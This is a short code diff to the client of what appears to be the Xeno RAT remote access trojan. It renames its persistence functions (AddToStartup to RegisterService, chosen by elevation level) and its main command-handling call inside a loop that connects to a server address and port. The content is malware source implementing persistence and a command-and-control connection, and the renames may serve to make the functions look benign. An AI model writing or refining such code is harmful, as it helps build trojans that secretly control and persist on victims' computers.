@@ -103,11 +103,11 @@ namespace xeno_rat_client
             }
             if (Utils.IsElevated())
             {
-                await Utils.AddToStartupAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                await Utils.RegisterServiceAdmin(Assembly.GetEntryAssembly().Location, startup_name);
             }
             else
             {
-                await Utils.AddToStartupNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
+                await Utils.RegisterServiceNonAdmin(Assembly.GetEntryAssembly().Location, startup_name);
             }
         }
 
@@ -122,7 +122,7 @@ namespace xeno_rat_client
                         await socket.ConnectAsync(ServerIp, ServerPort);
                         Server = await Utils.ConnectAndSetupAsync(socket, securityKey, 0, 0, HandleServiceStop);
                         Handler handle = new Handler(Server, ModuleManager);
-                        await handle.Type0Receive();
+                        await handle.HandleMainConnection();
                     }
                 }
                 catch (Exception e)
